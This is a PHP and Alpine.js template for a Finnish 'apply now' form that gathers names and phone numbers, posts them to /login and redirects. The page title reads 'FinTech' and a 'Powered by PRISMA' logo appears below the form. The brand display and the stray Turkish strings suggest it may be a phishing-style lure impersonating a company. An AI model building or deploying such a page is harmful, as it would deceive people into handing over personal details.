<?php
ob_start();
?>

<div x-data="loginForm()" class="min-h-screen flex items-start justify-center px-4 pt-20 pb-28 relative overflow-hidden">
    <div class="absolute inset-0" style="background: radial-gradient(1200px 700px at 50% 20%, rgba(255,255,255,0.12) 0%, rgba(255,255,255,0) 45%), linear-gradient(180deg, #0996d4 0%, #0b7fbc 55%, #0a6fb2 100%);"></div>
    <div class="absolute -left-28 -bottom-6 w-[620px] h-[620px] opacity-[0.18]" style="filter: blur(0px);">
        <svg viewBox="0 0 700 700" class="w-full h-full" aria-hidden="true">
            <defs>
                <linearGradient id="g1" x1="0" y1="0" x2="1" y2="1">
                    <stop offset="0" stop-color="#ffffff" stop-opacity="0.70" />
                    <stop offset="1" stop-color="#ffffff" stop-opacity="0.20" />
                </linearGradient>
                <linearGradient id="g2" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="0" stop-color="#ffffff" stop-opacity="0.55" />
                    <stop offset="1" stop-color="#ffffff" stop-opacity="0.10" />
                </linearGradient>
                <radialGradient id="glow" cx="35%" cy="35%" r="70%">
                    <stop offset="0" stop-color="#ffffff" stop-opacity="0.35" />
                    <stop offset="1" stop-color="#ffffff" stop-opacity="0" />
                </radialGradient>
                <filter id="soft" x="-20%" y="-20%" width="140%" height="140%">
                    <feGaussianBlur stdDeviation="2" />
                </filter>
            </defs>

            <circle cx="240" cy="520" r="260" fill="url(#glow)" />

            <g opacity="1">
                <g transform="translate(70 360) rotate(-8 210 180)">
                    <path d="M95 120h290c20 0 36 16 36 36v70c0 20-16 36-36 36H95c-20 0-36-16-36-36v-70c0-20 16-36 36-36z" fill="url(#g1)" />
                    <path d="M120 262h240v140c0 22-18 40-40 40H160c-22 0-40-18-40-40V262z" fill="url(#g2)" />
                    <path d="M240 120v322" fill="none" stroke="#fff" stroke-opacity="0.42" stroke-width="22" />
                    <path d="M240 120h181" fill="none" stroke="#fff" stroke-opacity="0.22" stroke-width="10" />
                    <path d="M240 120H59" fill="none" stroke="#fff" stroke-opacity="0.22" stroke-width="10" />
                    <path d="M198 92c-16-23-19-49 4-65 23-16 47-2 54 17 7-19 31-33 54-17 23 16 20 42 4 65-18 27-49 29-58 29s-40-2-58-29z" fill="url(#g1)" />
                    <path d="M152 170h176" fill="none" stroke="#fff" stroke-opacity="0.18" stroke-width="8" />
                    <path d="M142 300h196" fill="none" stroke="#fff" stroke-opacity="0.12" stroke-width="8" />
                </g>

                <g transform="translate(330 470) rotate(10 140 110)" opacity="0.95">
                    <rect x="40" y="70" width="210" height="140" rx="18" fill="url(#g2)" />
                    <rect x="60" y="210" width="170" height="120" rx="18" fill="url(#g1)" />
                    <path d="M145 70v260" fill="none" stroke="#fff" stroke-opacity="0.35" stroke-width="18" />
                    <path d="M40 140h210" fill="none" stroke="#fff" stroke-opacity="0.18" stroke-width="10" />
                    <path d="M120 46c-12-16-13-34 3-45 16-11 32-1 37 11 5-12 21-22 37-11 16 11 15 29 3 45-12 16-33 18-40 18s-28-2-40-18z" fill="url(#g1)" />
                </g>

                <g transform="translate(170 520) rotate(-16 90 70)" opacity="0.75" filter="url(#soft)">
                    <rect x="20" y="40" width="140" height="90" rx="14" fill="url(#g2)" />
                    <rect x="34" y="130" width="112" height="70" rx="14" fill="url(#g1)" />
                    <path d="M90 40v160" fill="none" stroke="#fff" stroke-opacity="0.25" stroke-width="12" />
                    <path d="M20 86h140" fill="none" stroke="#fff" stroke-opacity="0.14" stroke-width="8" />
                </g>
            </g>
        </svg>
    </div>

    <div class="relative w-full max-w-md">
        <div class="text-center mb-6">
            <h1 class="text-4xl font-extrabold tracking-wide" style="color:#ffcc2a; text-shadow: 0 2px 0 rgba(0,0,0,0.08);">HAE HETI</h1>
            <p class="text-white/90 text-sm mt-1">Jätä hakemus täyttämällä lomake</p>
        </div>

        <div class="mx-auto w-full max-w-[320px]">
            <form @submit.prevent="submitForm" class="space-y-3">
                <div>
                    <label class="block text-white/90 text-xs mb-1">Nimesi</label>
                    <input
                        type="text"
                        x-model="formData.firstName"
                        required
                        class="w-full h-10 px-3 rounded-sm bg-white text-gray-800 focus:outline-none focus:ring-2 focus:ring-white/60"
                        placeholder="Syötä nimesi"
                        :class="errors.firstName ? 'ring-2 ring-red-300' : ''"
                    >
                </div>

                <div>
                    <label class="block text-white/90 text-xs mb-1">Sukunimesi</label>
                    <input
                        type="text"
                        x-model="formData.lastName"
                        required
                        class="w-full h-10 px-3 rounded-sm bg-white text-gray-800 focus:outline-none focus:ring-2 focus:ring-white/60"
                        placeholder="Syötä sukunimesi"
                        :class="errors.lastName ? 'ring-2 ring-red-300' : ''"
                    >
                </div>

                <div>
                    <label class="block text-white/90 text-xs mb-1">Puhelin</label>
                    <div class="flex gap-2">
                        <div class="relative w-[130px]" @click.outside="closeCountry()">
                            <button
                                type="button"
                                class="h-10 w-full px-2 rounded-sm bg-white text-gray-800 focus:outline-none focus:ring-2 focus:ring-white/60 flex items-center justify-between"
                                @click="toggleCountry()"
                                aria-haspopup="listbox"
                                :aria-expanded="countryOpen"
                            >
                                <span class="flex items-center gap-2">
                                    <span class="text-base leading-none" x-text="selectedCountry ? flag(selectedCountry.code) : '🌐'"></span>
                                    <span class="font-medium" x-text="formData.countryCode"></span>
                                </span>
                                <svg class="w-4 h-4 text-gray-500" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
                                    <path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 0 1 1.06.02L10 11.168l3.71-3.94a.75.75 0 1 1 1.08 1.04l-4.24 4.5a.75.75 0 0 1-1.08 0l-4.24-4.5a.75.75 0 0 1 .02-1.06Z" clip-rule="evenodd" />
                                </svg>
                            </button>

                            <div
                                x-show="countryOpen"
                                x-transition.origin.top.left
                                class="absolute left-0 mt-1 w-[260px] bg-white text-gray-800 rounded-md shadow-xl ring-1 ring-black/10 z-50 overflow-hidden"
                                role="listbox"
                                style="display:none"
                            >
                                <div class="p-2 border-b border-gray-100 bg-white sticky top-0">
                                    <input
                                        type="text"
                                        x-model.trim="countryQuery"
                                        class="w-full h-9 px-2 rounded-md bg-gray-50 text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-200"
                                        placeholder="Ara ülke..."
                                    >
                                </div>

                                <div class="max-h-64 overflow-auto">
                                    <template x-for="c in filteredCountries" :key="c.code + c.dial_code">
                                        <button
                                            type="button"
                                            class="w-full px-3 py-2 text-left hover:bg-gray-50 flex items-center justify-between"
                                            @click="selectCountry(c)"
                                        >
                                            <span class="flex items-center gap-2">
                                                <span class="text-base leading-none" x-text="flag(c.code)"></span>
                                                <span class="text-sm" x-text="c.name"></span>
                                            </span>
                                            <span class="text-sm font-semibold" x-text="c.dial_code"></span>
                                        </button>
                                    </template>

                                    <div x-show="filteredCountries.length === 0" class="px-3 py-3 text-sm text-gray-500">
                                        Sonuç bulunamadı
                                    </div>
                                </div>
                            </div>
                        </div>
                        <input
                            type="tel"
                            x-model="formData.phoneNumber"
                            required
                            class="w-full h-10 px-3 rounded-sm bg-white text-gray-800 focus:outline-none focus:ring-2 focus:ring-white/60"
                            placeholder="401234567"
                            :class="errors.phone ? 'ring-2 ring-red-300' : ''"
                        >
                    </div>
                </div>

                <div x-show="errorMessage" x-text="errorMessage" class="text-xs text-red-100 bg-red-500/30 border border-red-200/30 rounded-sm px-3 py-2"></div>
                <div x-show="successMessage" x-text="successMessage" class="text-xs text-green-100 bg-green-500/30 border border-green-200/30 rounded-sm px-3 py-2"></div>

                <button
                    type="submit"
                    :disabled="loading"
                    class="w-full h-10 rounded-full bg-white text-gray-800 font-semibold shadow-md hover:shadow-lg transition disabled:opacity-60 disabled:cursor-not-allowed"
                >
                    <span x-show="!loading">Jatkaa</span>
                    <span x-show="loading">Käsitellään...</span>
                </button>
            </form>
        </div>

    </div>

    <div class="absolute bottom-6 left-1/2 -translate-x-1/2 text-white/70 text-xs">
        <div class="flex items-center justify-center gap-3">
            <div>Powered by</div>
            <img src="/prisma_logo.png" alt="PRISMA" class="h-24 w-auto opacity-100" />
        </div>
    </div>
</div>

<script>
function loginForm() {
    return {
        countries: [
            {"name":"Afghanistan","dial_code":"+93","code":"AF"},
            {"name":"Albania","dial_code":"+355","code":"AL"},
            {"name":"Algeria","dial_code":"+213","code":"DZ"},
            {"name":"American Samoa","dial_code":"+1-684","code":"AS"},
            {"name":"Andorra","dial_code":"+376","code":"AD"},
            {"name":"Angola","dial_code":"+244","code":"AO"},
            {"name":"Anguilla","dial_code":"+1-264","code":"AI"},
            {"name":"Antigua and Barbuda","dial_code":"+1-268","code":"AG"},
            {"name":"Argentina","dial_code":"+54","code":"AR"},
            {"name":"Armenia","dial_code":"+374","code":"AM"},
            {"name":"Aruba","dial_code":"+297","code":"AW"},
            {"name":"Australia","dial_code":"+61","code":"AU"},
            {"name":"Austria","dial_code":"+43","code":"AT"},
            {"name":"Azerbaijan","dial_code":"+994","code":"AZ"},
            {"name":"Bahamas","dial_code":"+1-242","code":"BS"},
            {"name":"Bahrain","dial_code":"+973","code":"BH"},
            {"name":"Bangladesh","dial_code":"+880","code":"BD"},
            {"name":"Barbados","dial_code":"+1-246","code":"BB"},
            {"name":"Belarus","dial_code":"+375","code":"BY"},
            {"name":"Belgium","dial_code":"+32","code":"BE"},
            {"name":"Belize","dial_code":"+501","code":"BZ"},
            {"name":"Benin","dial_code":"+229","code":"BJ"},
            {"name":"Bermuda","dial_code":"+1-441","code":"BM"},
            {"name":"Bhutan","dial_code":"+975","code":"BT"},
            {"name":"Bolivia","dial_code":"+591","code":"BO"},
            {"name":"Bosnia and Herzegovina","dial_code":"+387","code":"BA"},
            {"name":"Botswana","dial_code":"+267","code":"BW"},
            {"name":"Brazil","dial_code":"+55","code":"BR"},
            {"name":"British Indian Ocean Territory","dial_code":"+246","code":"IO"},
            {"name":"British Virgin Islands","dial_code":"+1-284","code":"VG"},
            {"name":"Brunei","dial_code":"+673","code":"BN"},
            {"name":"Bulgaria","dial_code":"+359","code":"BG"},
            {"name":"Burkina Faso","dial_code":"+226","code":"BF"},
            {"name":"Burundi","dial_code":"+257","code":"BI"},
            {"name":"Cambodia","dial_code":"+855","code":"KH"},
            {"name":"Cameroon","dial_code":"+237","code":"CM"},
            {"name":"Canada","dial_code":"+1","code":"CA"},
            {"name":"Cape Verde","dial_code":"+238","code":"CV"},
            {"name":"Cayman Islands","dial_code":"+1-345","code":"KY"},
            {"name":"Central African Republic","dial_code":"+236","code":"CF"},
            {"name":"Chad","dial_code":"+235","code":"TD"},
            {"name":"Chile","dial_code":"+56","code":"CL"},
            {"name":"China","dial_code":"+86","code":"CN"},
            {"name":"Christmas Island","dial_code":"+61","code":"CX"},
            {"name":"Cocos (Keeling) Islands","dial_code":"+61","code":"CC"},
            {"name":"Colombia","dial_code":"+57","code":"CO"},
            {"name":"Comoros","dial_code":"+269","code":"KM"},
            {"name":"Congo","dial_code":"+242","code":"CG"},
            {"name":"Congo, Dem. Rep.","dial_code":"+243","code":"CD"},
            {"name":"Cook Islands","dial_code":"+682","code":"CK"},
            {"name":"Costa Rica","dial_code":"+506","code":"CR"},
            {"name":"Cote d'Ivoire","dial_code":"+225","code":"CI"},
            {"name":"Croatia","dial_code":"+385","code":"HR"},
            {"name":"Cuba","dial_code":"+53","code":"CU"},
            {"name":"Curacao","dial_code":"+599","code":"CW"},
            {"name":"Cyprus","dial_code":"+357","code":"CY"},
            {"name":"Czech Republic","dial_code":"+420","code":"CZ"},
            {"name":"Denmark","dial_code":"+45","code":"DK"},
            {"name":"Djibouti","dial_code":"+253","code":"DJ"},
            {"name":"Dominica","dial_code":"+1-767","code":"DM"},
            {"name":"Dominican Republic","dial_code":"+1-809","code":"DO"},
            {"name":"Dominican Republic","dial_code":"+1-829","code":"DO"},
            {"name":"Dominican Republic","dial_code":"+1-849","code":"DO"},
            {"name":"Ecuador","dial_code":"+593","code":"EC"},
            {"name":"Egypt","dial_code":"+20","code":"EG"},
            {"name":"El Salvador","dial_code":"+503","code":"SV"},
            {"name":"Equatorial Guinea","dial_code":"+240","code":"GQ"},
            {"name":"Eritrea","dial_code":"+291","code":"ER"},
            {"name":"Estonia","dial_code":"+372","code":"EE"},
            {"name":"Eswatini","dial_code":"+268","code":"SZ"},
            {"name":"Ethiopia","dial_code":"+251","code":"ET"},
            {"name":"Falkland Islands","dial_code":"+500","code":"FK"},
            {"name":"Faroe Islands","dial_code":"+298","code":"FO"},
            {"name":"Fiji","dial_code":"+679","code":"FJ"},
            {"name":"Finland","dial_code":"+358","code":"FI"},
            {"name":"France","dial_code":"+33","code":"FR"},
            {"name":"French Guiana","dial_code":"+594","code":"GF"},
            {"name":"French Polynesia","dial_code":"+689","code":"PF"},
            {"name":"Gabon","dial_code":"+241","code":"GA"},
            {"name":"Gambia","dial_code":"+220","code":"GM"},
            {"name":"Georgia","dial_code":"+995","code":"GE"},
            {"name":"Germany","dial_code":"+49","code":"DE"},
            {"name":"Ghana","dial_code":"+233","code":"GH"},
            {"name":"Gibraltar","dial_code":"+350","code":"GI"},
            {"name":"Greece","dial_code":"+30","code":"GR"},
            {"name":"Greenland","dial_code":"+299","code":"GL"},
            {"name":"Grenada","dial_code":"+1-473","code":"GD"},
            {"name":"Guadeloupe","dial_code":"+590","code":"GP"},
            {"name":"Guam","dial_code":"+1-671","code":"GU"},
            {"name":"Guatemala","dial_code":"+502","code":"GT"},
            {"name":"Guernsey","dial_code":"+44-1481","code":"GG"},
            {"name":"Guinea","dial_code":"+224","code":"GN"},
            {"name":"Guinea-Bissau","dial_code":"+245","code":"GW"},
            {"name":"Guyana","dial_code":"+592","code":"GY"},
            {"name":"Haiti","dial_code":"+509","code":"HT"},
            {"name":"Honduras","dial_code":"+504","code":"HN"},
            {"name":"Hong Kong","dial_code":"+852","code":"HK"},
            {"name":"Hungary","dial_code":"+36","code":"HU"},
            {"name":"Iceland","dial_code":"+354","code":"IS"},
            {"name":"India","dial_code":"+91","code":"IN"},
            {"name":"Indonesia","dial_code":"+62","code":"ID"},
            {"name":"Iran","dial_code":"+98","code":"IR"},
            {"name":"Iraq","dial_code":"+964","code":"IQ"},
            {"name":"Ireland","dial_code":"+353","code":"IE"},
            {"name":"Isle of Man","dial_code":"+44-1624","code":"IM"},
            {"name":"Israel","dial_code":"+972","code":"IL"},
            {"name":"Italy","dial_code":"+39","code":"IT"},
            {"name":"Jamaica","dial_code":"+1-876","code":"JM"},
            {"name":"Japan","dial_code":"+81","code":"JP"},
            {"name":"Jersey","dial_code":"+44-1534","code":"JE"},
            {"name":"Jordan","dial_code":"+962","code":"JO"},
            {"name":"Kazakhstan","dial_code":"+7","code":"KZ"},
            {"name":"Kenya","dial_code":"+254","code":"KE"},
            {"name":"Kiribati","dial_code":"+686","code":"KI"},
            {"name":"Kuwait","dial_code":"+965","code":"KW"},
            {"name":"Kyrgyzstan","dial_code":"+996","code":"KG"},
            {"name":"Laos","dial_code":"+856","code":"LA"},
            {"name":"Latvia","dial_code":"+371","code":"LV"},
            {"name":"Lebanon","dial_code":"+961","code":"LB"},
            {"name":"Lesotho","dial_code":"+266","code":"LS"},
            {"name":"Liberia","dial_code":"+231","code":"LR"},
            {"name":"Libya","dial_code":"+218","code":"LY"},
            {"name":"Liechtenstein","dial_code":"+423","code":"LI"},
            {"name":"Lithuania","dial_code":"+370","code":"LT"},
            {"name":"Luxembourg","dial_code":"+352","code":"LU"},
            {"name":"Macau","dial_code":"+853","code":"MO"},
            {"name":"Madagascar","dial_code":"+261","code":"MG"},
            {"name":"Malawi","dial_code":"+265","code":"MW"},
            {"name":"Malaysia","dial_code":"+60","code":"MY"},
            {"name":"Maldives","dial_code":"+960","code":"MV"},
            {"name":"Mali","dial_code":"+223","code":"ML"},
            {"name":"Malta","dial_code":"+356","code":"MT"},
            {"name":"Marshall Islands","dial_code":"+692","code":"MH"},
            {"name":"Martinique","dial_code":"+596","code":"MQ"},
            {"name":"Mauritania","dial_code":"+222","code":"MR"},
            {"name":"Mauritius","dial_code":"+230","code":"MU"},
            {"name":"Mayotte","dial_code":"+262","code":"YT"},
            {"name":"Mexico","dial_code":"+52","code":"MX"},
            {"name":"Micronesia","dial_code":"+691","code":"FM"},
            {"name":"Moldova","dial_code":"+373","code":"MD"},
            {"name":"Monaco","dial_code":"+377","code":"MC"},
            {"name":"Mongolia","dial_code":"+976","code":"MN"},
            {"name":"Montenegro","dial_code":"+382","code":"ME"},
            {"name":"Montserrat","dial_code":"+1-664","code":"MS"},
            {"name":"Morocco","dial_code":"+212","code":"MA"},
            {"name":"Mozambique","dial_code":"+258","code":"MZ"},
            {"name":"Myanmar","dial_code":"+95","code":"MM"},
            {"name":"Namibia","dial_code":"+264","code":"NA"},
            {"name":"Nauru","dial_code":"+674","code":"NR"},
            {"name":"Nepal","dial_code":"+977","code":"NP"},
            {"name":"Netherlands","dial_code":"+31","code":"NL"},
            {"name":"New Caledonia","dial_code":"+687","code":"NC"},
            {"name":"New Zealand","dial_code":"+64","code":"NZ"},
            {"name":"Nicaragua","dial_code":"+505","code":"NI"},
            {"name":"Niger","dial_code":"+227","code":"NE"},
            {"name":"Nigeria","dial_code":"+234","code":"NG"},
            {"name":"Niue","dial_code":"+683","code":"NU"},
            {"name":"North Korea","dial_code":"+850","code":"KP"},
            {"name":"North Macedonia","dial_code":"+389","code":"MK"},
            {"name":"Northern Mariana Islands","dial_code":"+1-670","code":"MP"},
            {"name":"Norway","dial_code":"+47","code":"NO"},
            {"name":"Oman","dial_code":"+968","code":"OM"},
            {"name":"Pakistan","dial_code":"+92","code":"PK"},
            {"name":"Palau","dial_code":"+680","code":"PW"},
            {"name":"Palestine","dial_code":"+970","code":"PS"},
            {"name":"Panama","dial_code":"+507","code":"PA"},
            {"name":"Papua New Guinea","dial_code":"+675","code":"PG"},
            {"name":"Paraguay","dial_code":"+595","code":"PY"},
            {"name":"Peru","dial_code":"+51","code":"PE"},
            {"name":"Philippines","dial_code":"+63","code":"PH"},
            {"name":"Poland","dial_code":"+48","code":"PL"},
            {"name":"Portugal","dial_code":"+351","code":"PT"},
            {"name":"Puerto Rico","dial_code":"+1-787","code":"PR"},
            {"name":"Puerto Rico","dial_code":"+1-939","code":"PR"},
            {"name":"Qatar","dial_code":"+974","code":"QA"},
            {"name":"Reunion","dial_code":"+262","code":"RE"},
            {"name":"Romania","dial_code":"+40","code":"RO"},
            {"name":"Russia","dial_code":"+7","code":"RU"},
            {"name":"Rwanda","dial_code":"+250","code":"RW"},
            {"name":"Saint Barthelemy","dial_code":"+590","code":"BL"},
            {"name":"Saint Helena","dial_code":"+290","code":"SH"},
            {"name":"Saint Kitts and Nevis","dial_code":"+1-869","code":"KN"},
            {"name":"Saint Lucia","dial_code":"+1-758","code":"LC"},
            {"name":"Saint Martin","dial_code":"+590","code":"MF"},
            {"name":"Saint Pierre and Miquelon","dial_code":"+508","code":"PM"},
            {"name":"Saint Vincent and the Grenadines","dial_code":"+1-784","code":"VC"},
            {"name":"Samoa","dial_code":"+685","code":"WS"},
            {"name":"San Marino","dial_code":"+378","code":"SM"},
            {"name":"Sao Tome and Principe","dial_code":"+239","code":"ST"},
            {"name":"Saudi Arabia","dial_code":"+966","code":"SA"},
            {"name":"Senegal","dial_code":"+221","code":"SN"},
            {"name":"Serbia","dial_code":"+381","code":"RS"},
            {"name":"Seychelles","dial_code":"+248","code":"SC"},
            {"name":"Sierra Leone","dial_code":"+232","code":"SL"},
            {"name":"Singapore","dial_code":"+65","code":"SG"},
            {"name":"Sint Maarten","dial_code":"+1-721","code":"SX"},
            {"name":"Slovakia","dial_code":"+421","code":"SK"},
            {"name":"Slovenia","dial_code":"+386","code":"SI"},
            {"name":"Solomon Islands","dial_code":"+677","code":"SB"},
            {"name":"Somalia","dial_code":"+252","code":"SO"},
            {"name":"South Africa","dial_code":"+27","code":"ZA"},
            {"name":"South Korea","dial_code":"+82","code":"KR"},
            {"name":"South Sudan","dial_code":"+211","code":"SS"},
            {"name":"Spain","dial_code":"+34","code":"ES"},
            {"name":"Sri Lanka","dial_code":"+94","code":"LK"},
            {"name":"Sudan","dial_code":"+249","code":"SD"},
            {"name":"Suriname","dial_code":"+597","code":"SR"},
            {"name":"Sweden","dial_code":"+46","code":"SE"},
            {"name":"Switzerland","dial_code":"+41","code":"CH"},
            {"name":"Syria","dial_code":"+963","code":"SY"},
            {"name":"Taiwan","dial_code":"+886","code":"TW"},
            {"name":"Tajikistan","dial_code":"+992","code":"TJ"},
            {"name":"Tanzania","dial_code":"+255","code":"TZ"},
            {"name":"Thailand","dial_code":"+66","code":"TH"},
            {"name":"Timor-Leste","dial_code":"+670","code":"TL"},
            {"name":"Togo","dial_code":"+228","code":"TG"},
            {"name":"Tokelau","dial_code":"+690","code":"TK"},
            {"name":"Tonga","dial_code":"+676","code":"TO"},
            {"name":"Trinidad and Tobago","dial_code":"+1-868","code":"TT"},
            {"name":"Tunisia","dial_code":"+216","code":"TN"},
            {"name":"Turkey","dial_code":"+90","code":"TR"},
            {"name":"Turkmenistan","dial_code":"+993","code":"TM"},
            {"name":"Turks and Caicos Islands","dial_code":"+1-649","code":"TC"},
            {"name":"Tuvalu","dial_code":"+688","code":"TV"},
            {"name":"U.S. Virgin Islands","dial_code":"+1-340","code":"VI"},
            {"name":"Uganda","dial_code":"+256","code":"UG"},
            {"name":"Ukraine","dial_code":"+380","code":"UA"},
            {"name":"United Arab Emirates","dial_code":"+971","code":"AE"},
            {"name":"United Kingdom","dial_code":"+44","code":"GB"},
            {"name":"United States","dial_code":"+1","code":"US"},
            {"name":"Uruguay","dial_code":"+598","code":"UY"},
            {"name":"Uzbekistan","dial_code":"+998","code":"UZ"},
            {"name":"Vanuatu","dial_code":"+678","code":"VU"},
            {"name":"Vatican City","dial_code":"+379","code":"VA"},
            {"name":"Venezuela","dial_code":"+58","code":"VE"},
            {"name":"Vietnam","dial_code":"+84","code":"VN"},
            {"name":"Wallis and Futuna","dial_code":"+681","code":"WF"},
            {"name":"Yemen","dial_code":"+967","code":"YE"},
            {"name":"Zambia","dial_code":"+260","code":"ZM"},
            {"name":"Zimbabwe","dial_code":"+263","code":"ZW"}
        ],
        countryOpen: false,
        countryQuery: '',
        get selectedCountry() {
            const dial = (this.formData.countryCode || '').toString();
            return this.countries.find(c => c.dial_code === dial) || null;
        },
        get filteredCountries() {
            const q = (this.countryQuery || '').toLowerCase();
            if (!q) return this.countries;
            return this.countries.filter(c => {
                return (
                    (c.name || '').toLowerCase().includes(q) ||
                    (c.dial_code || '').toLowerCase().includes(q) ||
                    (c.code || '').toLowerCase().includes(q)
                );
            });
        },
        toggleCountry() {
            this.countryOpen = !this.countryOpen;
            if (this.countryOpen) {
                this.countryQuery = '';
            }
        },
        closeCountry() {
            this.countryOpen = false;
        },
        selectCountry(c) {
            this.formData.countryCode = c.dial_code;
            this.countryOpen = false;
        },
        flag(code) {
            const cc = (code || '').toString().toUpperCase();
            if (cc.length !== 2) return '🌐';
            const a = cc.charCodeAt(0) - 65 + 0x1F1E6;
            const b = cc.charCodeAt(1) - 65 + 0x1F1E6;
            return String.fromCodePoint(a, b);
        },
        formData: {
            firstName: '',
            lastName: '',
            countryCode: '+358',
            phoneNumber: ''
        },
        errors: {},
        errorMessage: '',
        successMessage: '',
        loading: false,

        submitForm() {
            this.errors = {};
            this.errorMessage = '';
            this.successMessage = '';
            this.loading = true;

            // Client-side validation
            if (!this.formData.firstName.trim()) {
                this.errors.firstName = 'Etunimi on pakollinen';
                this.loading = false;
                return;
            }

            if (!this.formData.lastName.trim()) {
                this.errors.lastName = 'Sukunimi on pakollinen';
                this.loading = false;
                return;
            }

            if (!this.formData.phoneNumber || !this.formData.phoneNumber.toString().trim()) {
                this.errors.phone = 'Puhelinnumero on pakollinen';
                this.loading = false;
                return;
            }

            const cleanedNumber = (this.formData.phoneNumber || '').toString().replace(/[^0-9]/g, '');
            const dial = (this.formData.countryCode || '').toString().trim();
            const phone = dial + cleanedNumber;

            if (!cleanedNumber) {
                this.errors.phone = 'Puhelinnumero on pakollinen';
                this.loading = false;
                return;
            }

            // Submit to server
            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    first_name: this.formData.firstName.trim(),
                    last_name: this.formData.lastName.trim(),
                    phone: phone
                })
            })
            .then(response => response.json())
            .then(data => {
                this.loading = false;
                if (data.success) {
                    this.successMessage = data.message;
                    setTimeout(() => {
                        window.location.href = data.redirect;
                    }, 500);
                } else {
                    this.errorMessage = data.message || 'Tapahtui virhe. Yritä uudelleen.';
                }
            })
            .catch(() => {
                this.loading = false;
                this.errorMessage = 'Yhteysvirhe. Yritä uudelleen.';
            });
        }
    }
}
</script>

<?php
$content = ob_get_clean();
$title = 'Tervetuloa - FinTech';
 $additionalStyles = '<style>body{background:#0996d4 !important;}</style>';
include __DIR__ . '/../layout.php';
?>

